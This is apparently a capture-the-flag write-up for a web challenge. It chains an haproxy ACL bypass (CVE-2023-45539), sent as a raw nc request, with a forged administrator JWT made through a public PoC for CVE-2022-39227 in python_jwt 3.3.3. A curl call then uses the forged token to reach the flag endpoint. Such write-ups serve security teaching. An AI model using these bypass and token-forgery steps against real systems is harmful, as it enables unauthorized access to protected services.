# [Web - medium] LockTalk

We are presented with a Python webapp. The Dockerfile downloads `haproxy-2.8.1`, which is the load balancer in front of the webapp served by `uwsgi`.

The webapp holds a chat between ransomware operators and their victims. As a guest we can use the `get_ticket` endpoint, while accessing the `chat` and `flag` are for administrator role. However haproxy configuration blocks access to the `get_ticket` endpoint.

```bash
frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend
    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```

Looking for haproxy vulnerability, we have the conditions to exploit [CVE-2023-45539](https://nvd.nist.gov/vuln/detail/CVE-2023-45539). This allows to bypass the deny rule by adding a `#` sign at the end of the URL. Going to the `get_ticket` endpoint will get us a valid JWT token.

```python
@api_blueprint.route('/get_ticket', methods=['GET'])
def get_ticket():
    claims = {
        "role": "guest",
        "user": "guest_user"
    }
    token = jwt.generate_jwt(claims, current_app.config.get('JWT_SECRET_KEY'), 'PS256', datetime.timedelta(minutes=60))
    return jsonify({'ticket: ': token})
```

Using haproxy vulnerability to bypass the ACL and access this endpoint, we get our JWT back.

```bash
$ printf "GET /api/v1/get_ticket# HTTP/1.1\r\nhost: whatever\r\n\r\n" | nc -vw1 94.237.49.197 41543
Connection to 94.237.49.197 port 41543 [tcp/*] succeeded!
HTTP/1.1 200 OK
content-type: application/json
content-length: 554
server: uWSGI Server

{"ticket: ":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwMDkyMjEsImlhdCI6MTcxMDAwNTYyMSwianRpIjoiNzZ2OFMwYks1MERLRXVLME1ZejRMZyIsIm5iZiI6MTcxMDAwNTYyMSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X\
3VzZXIifQ.kmmwXY60Habyu5qAGy-Ra_gD1VT6xmwq9QCr9weCtUVBIetE4ompTBxqTdy_KvvPzzFzYFa9XPAKnfoD4Z9luAFagR9vDNjqXJgmBmXil4dgR0UV0JZoOTURvtj0onv3pcDqiPHrcqO1HqEQ44QfLC0U0uJGbe1HDWLyvhgrgVPtNFF1eEqSu9pYXTjb_\
OfILkMxOKCv0mEQViOWIzic0CBmS5PlJ8XU5dNFITjV21K4AWFj8GWsC_tfhoVQ7Hyz0yFqGcmzsZcy9PkpwDefB9Fbz2VLjxvWBcwu2y4SlefJZD9UtNjC-bK3wkWwKgwTm8lBDzNZO4jZ587Q_S-9Mg"}
```

From there we need to find a way to escalate our guest claim into an administrator one. The library used to validate jwt is `python_jwt` especially from this `middleware.py` snippet.

```python
import python_jwt as jwt
[...]
def authorize_roles(roles):
    def decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            token = request.headers.get('Authorization')
            if not token:
                return jsonify({'message': 'JWT token is missing or invalid.'}), 401
            try:
                token = jwt.verify_jwt(token, current_app.config.get('JWT_SECRET_KEY'), ['PS256'])
                user_role = token[1]['role']
                if user_role not in roles:
                    return jsonify({'message': f'{user_role} user does not have the required authorization to access the resource.'}), 403
                return func(*args, **kwargs)
```

The version used is `3.3.3` which is vulnerable to [CVE-2022-39227](https://nvd.nist.gov/vuln/detail/CVE-2022-39227) and has a [PoC is available](https://github.com/user0x1337/CVE-2022-39227/tree/main)

```bash
$ cat conf/requirements.txt
uwsgi
Flask
requests
python_jwt==3.3.3
```

Using that Python PoC, we can reuse our `"role": "guest"` claim JWT to modify it with a `"role": "administrator"` claim.

```bash
$ python cve_2022_39227.py -j 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwMDkyMjEsImlhdCI6MTcxMDAwNTYyMSwianRpIjoiNzZ2OFMwYks1MERLRXVLME1ZejRMZyIsIm5iZiI6MTcxMDAwNTYyMSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.kmmwXY60Habyu5qAGy-Ra_gD1VT6xmwq9QCr9weCtUVBIetE4ompTBxqTdy_KvvPzzFzYFa9XPAKnfoD4Z9luAFagR9vDNjqXJgmBmXil4dgR0UV0JZoOTURvtj0onv3pcDqiPHrcqO1HqEQ44QfLC0U0uJGbe1HDWLyvhgrgVPtNFF1eEqSu9pYXTjb_OfILkMxOKCv0mEQViOWIzic0CBmS5PlJ8XU5dNFITjV21K4AWFj8GWsC_tfhoVQ7Hyz0yFqGcmzsZcy9PkpwDefB9Fbz2VLjxvWBcwu2y4SlefJZD9UtNjC-bK3wkWwKgwTm8lBDzNZO4jZ587Q_S-9Mg' -i 'role=administrator'
[+] Retrieved base64 encoded payload: eyJleHAiOjE3MTAwMDkyMjEsImlhdCI6MTcxMDAwNTYyMSwianRpIjoiNzZ2OFMwYks1MERLRXVLME1ZejRMZyIsIm5iZiI6MTcxMDAwNTYyMSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ
[+] Decoded payload: {'exp': 1710009221, 'iat': 1710005621, 'jti': '76v8S0bK50DKEuK0MYz4Lg', 'nbf': 1710005621, 'role': 'guest', 'user': 'guest_user'}
[+] Inject new "fake" payload: {'exp': 1710009221, 'iat': 1710005621, 'jti': '76v8S0bK50DKEuK0MYz4Lg', 'nbf': 1710005621, 'role': 'administrator', 'user': 'guest_user'}
[+] Fake payload encoded: eyJleHAiOjE3MTAwMDkyMjEsImlhdCI6MTcxMDAwNTYyMSwianRpIjoiNzZ2OFMwYks1MERLRXVLME1ZejRMZyIsIm5iZiI6MTcxMDAwNTYyMSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9

[+] New token:
 {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwMDkyMjEsImlhdCI6MTcxMDAwNTYyMSwianRpIjoiNzZ2OFMwYks1MERLRXVLME1ZejRMZyIsIm5iZiI6MTcxMDAwNTYyMSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAwMDkyMjEsImlhdCI6MTcxMDAwNTYyMSwianRpIjoiNzZ2OFMwYks1MERLRXVLME1ZejRMZyIsIm5iZiI6MTcxMDAwNTYyMSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"kmmwXY60Habyu5qAGy-Ra_gD1VT6xmwq9QCr9weCtUVBIetE4ompTBxqTdy_KvvPzzFzYFa9XPAKnfoD4Z9luAFagR9vDNjqXJgmBmXil4dgR0UV0JZoOTURvtj0onv3pcDqiPHrcqO1HqEQ44QfLC0U0uJGbe1HDWLyvhgrgVPtNFF1eEqSu9pYXTjb_OfILkMxOKCv0mEQViOWIzic0CBmS5PlJ8XU5dNFITjV21K4AWFj8GWsC_tfhoVQ7Hyz0yFqGcmzsZcy9PkpwDefB9Fbz2VLjxvWBcwu2y4SlefJZD9UtNjC-bK3wkWwKgwTm8lBDzNZO4jZ587Q_S-9Mg"}

Example (HTTP-Cookie):
------------------------------
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwMDkyMjEsImlhdCI6MTcxMDAwNTYyMSwianRpIjoiNzZ2OFMwYks1MERLRXVLME1ZejRMZyIsIm5iZiI6MTcxMDAwNTYyMSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAwMDkyMjEsImlhdCI6MTcxMDAwNTYyMSwianRpIjoiNzZ2OFMwYks1MERLRXVLME1ZejRMZyIsIm5iZiI6MTcxMDAwNTYyMSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"kmmwXY60Habyu5qAGy-Ra_gD1VT6xmwq9QCr9weCtUVBIetE4ompTBxqTdy_KvvPzzFzYFa9XPAKnfoD4Z9luAFagR9vDNjqXJgmBmXil4dgR0UV0JZoOTURvtj0onv3pcDqiPHrcqO1HqEQ44QfLC0U0uJGbe1HDWLyvhgrgVPtNFF1eEqSu9pYXTjb_OfILkMxOKCv0mEQViOWIzic0CBmS5PlJ8XU5dNFITjV21K4AWFj8GWsC_tfhoVQ7Hyz0yFqGcmzsZcy9PkpwDefB9Fbz2VLjxvWBcwu2y4SlefJZD9UtNjC-bK3wkWwKgwTm8lBDzNZO4jZ587Q_S-9Mg"}
```

Finally using that administrator JWT we can use the `flag` endpoint.

```bash
$ curl -H 'Authorization: {"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAwMDkyMjEsImlhdCI6MTcxMDAwNTYyMSwianRpIjoiNzZ2OFMwYks1MERLRXVLME1ZejRMZyIsIm5iZiI6MTcxMDAwNTYyMSwicm9sZSI6ImFkbWluaXN0cmF0b3IiLCJ1c2VyIjoiZ3Vlc3RfdXNlciJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTAwMDkyMjEsImlhdCI6MTcxMDAwNTYyMSwianRpIjoiNzZ2OFMwYks1MERLRXVLME1ZejRMZyIsIm5iZiI6MTcxMDAwNTYyMSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ","signature":"kmmwXY60Habyu5qAGy-Ra_gD1VT6xmwq9QCr9weCtUVBIetE4ompTBxqTdy_KvvPzzFzYFa9XPAKnfoD4Z9luAFagR9vDNjqXJgmBmXil4dgR0UV0JZoOTURvtj0onv3pcDqiPHrcqO1HqEQ44QfLC0U0uJGbe1HDWLyvhgrgVPtNFF1eEqSu9pYXTjb_OfILkMxOKCv0mEQViOWIzic0CBmS5PlJ8XU5dNFITjV21K4AWFj8GWsC_tfhoVQ7Hyz0yFqGcmzsZcy9PkpwDefB9Fbz2VLjxvWBcwu2y4SlefJZD9UtNjC-bK3wkWwKgwTm8lBDzNZO4jZ587Q_S-9Mg"}' 'http://94.237.49.197:41543/api/v1/flag'
{"message":"HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}"}
```